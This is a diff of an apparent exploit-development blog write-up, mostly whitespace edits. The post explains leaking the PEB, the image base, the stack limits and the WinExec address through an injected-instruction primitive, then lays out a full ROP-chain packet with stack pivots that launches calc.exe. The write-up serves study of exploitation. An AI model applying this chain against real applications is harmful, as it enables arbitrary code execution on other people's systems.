@@ -44,9 +44,12 @@ This value will be used in WriteProcessMemory as lpBuffer, basically copying the
 Although this is quite good, it provides a limitation of instructions, meaning we can only use instructions byte+488b01c3c3c3c3.
 I made a quick script in python producing all the values in a file
 
-`byte=0x00  
+`byte=0x00
+
 endbyte=0xff  
+
 start ="848b01c3c3c3"  
+
 for i in xrange(byte,endbyte+1):  
             print format(i,'X')+ start`
 
@@ -68,6 +71,7 @@ We could achieve and acquire the PEB. \x65 is meant for the combination from the
 65488b01c3 
 
 `0:  65 48 8b 01             mov    rax,QWORD PTR gs:[rcx]  
+
 4:  c3                      ret`
 
 
@@ -82,6 +86,7 @@ Image Base Address is located from the PEB + 0x10 offset. In this case we had to
 In this case, according to our possible instructions we chose:  
 
 `0:  47 8b 01                mov    rax,QWORD PTR [rcx]  
+
 3:  c3                      ret`
 
 
@@ -108,6 +113,7 @@ StackBaseLimit is in the TEB at 0x10 offset through the GS register.
 The initial request I used :
 
 `0:  65 48 8b 01             mov    rax,QWORD PTR gs:[rcx]  
+
 4:  c3                      ret`
 
 I controlled the RCX by setting it to 0x10.  
@@ -124,19 +130,20 @@ In the above scenario I used:
 
 `
 0:  47 8b 01                mov    rax,QWORD PTR [rcx]  
+
 3:  c3                      ret`
 
 With RCX as the Stack Base Limit and constantly adding 0x08 to it.  
 
 The next step would be to get the winexec’s address on the stack. By checking the .rdata of the application I could see the offset of it.
-
-pic4 [![](https://github.com/trickster0/trickster0.github.io/raw/master/assets/img/favicons/4.png)](https://github.com/trickster0/trickster0.github.io/raw/master/assets/img/favicons/4.png)
+[![](https://github.com/trickster0/trickster0.github.io/raw/master/assets/img/favicons/4.png)](https://github.com/trickster0/trickster0.github.io/raw/master/assets/img/favicons/4.png)
 
 In this case, I need to leak the address from Image Base Address + 0x9010 offset.  
 
 By using exactly the same instructions as before:
 
 `0:  47 8b 01                mov    rax,QWORD PTR [rcx]  
+
 3:  c3                      ret`
 
 Then adding RCX as the Image Base Address+0x9010 , I get the leaked address for Winexec on the stack.  
@@ -144,7 +151,9 @@ Then adding RCX as the Image Base Address+0x9010 , I get the leaked address for 
 For the final request to the application I used 
 
 `0:  51                      push   rcx
-1:  48 8b 01                mov    rax,QWORD PTR [rcx]  
+
+1:  48 8b 01                mov    rax,QWORD PTR [rcx] 
+
 4:  c3                      ret`
 
 I set the RCX to a pivot gadget “add rsp,78h ; ret”, so I can stack pivot.  
@@ -162,25 +171,45 @@ The structure of the packet is this. The whole packet is the cookie + 528 charac
 Structure:
 
 `|16 junk bytes| - padding  
+
 |pop_rax_gadget| - Pop Image Base Address for having a valid address on RAX because the only pop rdx and pop rdx gadgets set bad values to it.  
+
 |Image Base Address – 0x08| - valid address  
+
 |pop_rdx_gadget| - pop rdx gadget to put 0x01 for the Wincalc second argument.  
+
 |0x01|- Winexec UINT   uCmdShow  
+
 |pop_rax_gadget| - again for the same reason that the pop rcx gadget will set bad value to rax  
+
 |pop_rcx_gadget| - set the pointer address that points to calc.exe\x00  
+
 |address_pointing_calc| - address that points to calc.exe\x00  
+
 |72 junk bytes| - padding  
+
 |ret_gadget| - just a return gadget to fix the stack alignment to 16-byte format, because CreateProcessA is called inside the Winexec function which includes movabs instruction. Movabs instructions check if the stack is aligned and if not it will raise an exception.  
+
 |winexec_leaked_address| - winexec address on the stack.  
+
 |add_rsp_0x78| - adds to current RSP + 0x78 bytes to reach the next stack pivot.  
+
 |120 junk bytes| - padding.  
+
 |add_rsp_0x78| - adds to current RSP + 0x78 bytes to reach the next stack pivot.  
+
 |120 junk bytes| - padding.  
-|add_rsp_0x28| - adds to current RSP + 0x28 bytes to reach the next stack pivot.  
+
+|add_rsp_0x28| - adds to current RSP + 0x28 bytes to reach the next stack pivot. 
+
 |40 junk bytes| - padding.  
-|add_rsp_0x58| - adds to current RSP + 0x58 bytes to reach the original return pointer address and continue the execution of the application instead of crashing it.  
+
+|add_rsp_0x58| - adds to current RSP + 0x58 bytes to reach the original return pointer address and continue the execution of the application instead of crashing it. 
+
 |8 junk bytes| - padding.  
+
 |calc.exe\x00| - string to set in memory.  
+
 |15 junk bytes| - padding.`
 
 
